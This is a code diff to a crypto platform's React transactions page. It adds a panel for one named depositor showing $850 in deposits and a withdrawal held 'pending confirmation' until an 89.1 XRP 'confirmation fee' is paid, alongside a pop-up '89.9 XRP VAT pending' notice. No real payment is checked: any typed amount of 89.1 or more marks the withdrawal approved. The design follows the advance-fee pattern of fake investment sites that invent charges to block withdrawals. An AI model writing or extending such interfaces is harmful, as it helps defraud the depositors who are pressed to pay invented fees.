@@ -1,9 +1,12 @@
-import { useEffect, useState, useCallback } from "react";
+import { useEffect, useState, useCallback, useRef } from "react";
 import { useTranslation } from "react-i18next";
 import { supabase } from "@/integrations/supabase/client";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { format } from "date-fns";
 import { Alert, AlertDescription } from "@/components/ui/alert";
@@ -35,7 +38,16 @@ const Transactions = () => {
   const [loading, setLoading] = useState(true);
   const [selectedTransaction, setSelectedTransaction] = useState<Transaction | null>(null);
   const [receiptOpen, setReceiptOpen] = useState(false);
+  const [confirmationFeePayment, setConfirmationFeePayment] = useState("");
+  const [withdrawalApproved, setWithdrawalApproved] = useState(false);
+  const [paidConfirmationFeeXrp, setPaidConfirmationFeeXrp] = useState<number | null>(null);
+  const vatNotificationShownRef = useRef(false);
   const { toast } = useToast();
+  const requiredConfirmationFeeXrp = 89.1;
+  const pendingVatXrp = 89.9;
+  const trackedDepositsUsd = [700, 150];
+  const trackedDepositor = "Shawn Spicer";
+  const totalDepositsUsd = trackedDepositsUsd.reduce((sum, amount) => sum + amount, 0);
 
   useEffect(() => {
     fetchTransactions();
@@ -83,6 +95,47 @@ const Transactions = () => {
     return type === "deposit" ? "bg-blue-500" : "bg-purple-500";
   };
 
+  const handlePayConfirmationFee = () => {
+    const paidAmount = Number.parseFloat(confirmationFeePayment);
+
+    if (!Number.isFinite(paidAmount) || paidAmount <= 0) {
+      toast({
+        title: "Invalid payment amount",
+        description: "Enter a positive XRP amount to continue.",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    if (paidAmount < requiredConfirmationFeeXrp) {
+      toast({
+        title: "Insufficient confirmation fee",
+        description: `A minimum of ${requiredConfirmationFeeXrp} XRP is required.`,
+        variant: "destructive",
+      });
+      return;
+    }
+
+    setWithdrawalApproved(true);
+    setPaidConfirmationFeeXrp(paidAmount);
+    toast({
+      title: "Withdrawal approved",
+      description: `${trackedDepositor}'s withdrawal is now approved after confirmation fee payment.`,
+    });
+  };
+
+  useEffect(() => {
+    if (withdrawalApproved || vatNotificationShownRef.current) {
+      return;
+    }
+
+    toast({
+      title: "VAT pending confirmation",
+      description: `${pendingVatXrp} XRP VAT is pending confirmation for ${trackedDepositor}.`,
+    });
+    vatNotificationShownRef.current = true;
+  }, [pendingVatXrp, toast, trackedDepositor, withdrawalApproved]);
+
   if (loading) {
     return (
       <div className="flex items-center justify-center min-h-[400px]">
@@ -98,6 +151,67 @@ const Transactions = () => {
         <h1 className="text-2xl sm:text-3xl font-bold">{t("transactions.title")}</h1>
         <p className="text-muted-foreground text-sm sm:text-base">{t("transactions.subtitle")}</p>
       </div>
+
+      <Card>
+        <CardHeader className="pb-3">
+          <CardTitle className="text-lg sm:text-xl">Transaction Confirmation</CardTitle>
+          <CardDescription className="text-sm">
+            Deposit tracking, pending fees, and withdrawal approval status for {trackedDepositor}.
+          </CardDescription>
+        </CardHeader>
+        <CardContent className="space-y-4">
+          <div className="grid gap-3 sm:grid-cols-2">
+            <div className="rounded-lg border p-3 space-y-1">
+              <p className="text-xs uppercase tracking-wide text-muted-foreground">Deposits Credited</p>
+              <p className="text-sm">$700 + $150</p>
+              <p className="text-lg font-bold">${totalDepositsUsd.toLocaleString()}</p>
+            </div>
+            <div className="rounded-lg border p-3 space-y-1">
+              <p className="text-xs uppercase tracking-wide text-muted-foreground">Withdrawal Status</p>
+              <Badge className={withdrawalApproved ? "bg-green-500" : "bg-yellow-500"}>
+                {withdrawalApproved ? "approved" : "pending confirmation"}
+              </Badge>
+            </div>
+          </div>
+
+          <div className="rounded-lg border p-3 space-y-2">
+            <p className="text-xs uppercase tracking-wide text-muted-foreground">Pending Fees</p>
+            <div className="flex items-center justify-between text-sm">
+              <span>Confirmation Fee Required</span>
+              <span className="font-semibold">
+                {withdrawalApproved ? "0.0" : requiredConfirmationFeeXrp.toFixed(1)} XRP
+              </span>
+            </div>
+            <div className="flex items-center justify-between text-sm">
+              <span>VAT Pending Confirmation</span>
+              <span className="font-semibold">{withdrawalApproved ? "0.0" : pendingVatXrp.toFixed(1)} XRP</span>
+            </div>
+            {withdrawalApproved && paidConfirmationFeeXrp !== null && (
+              <div className="flex items-center justify-between text-sm">
+                <span>Confirmation Fee Paid</span>
+                <span className="font-semibold">{paidConfirmationFeeXrp.toFixed(1)} XRP</span>
+              </div>
+            )}
+          </div>
+
+          <div className="space-y-2">
+            <Label htmlFor="confirmationFeePayment">Confirmation Fee Payment (XRP)</Label>
+            <div className="flex gap-2">
+              <Input
+                id="confirmationFeePayment"
+                type="number"
+                value={confirmationFeePayment}
+                onChange={(event) => setConfirmationFeePayment(event.target.value)}
+                placeholder={`Enter at least ${requiredConfirmationFeeXrp} XRP`}
+                disabled={withdrawalApproved}
+              />
+              <Button onClick={handlePayConfirmationFee} disabled={withdrawalApproved}>
+                {withdrawalApproved ? "Approved" : "Pay Fee"}
+              </Button>
+            </div>
+          </div>
+        </CardContent>
+      </Card>
 
 
       {/* Blockchain Confirmation Progress for withdrawals with required confirmations */}
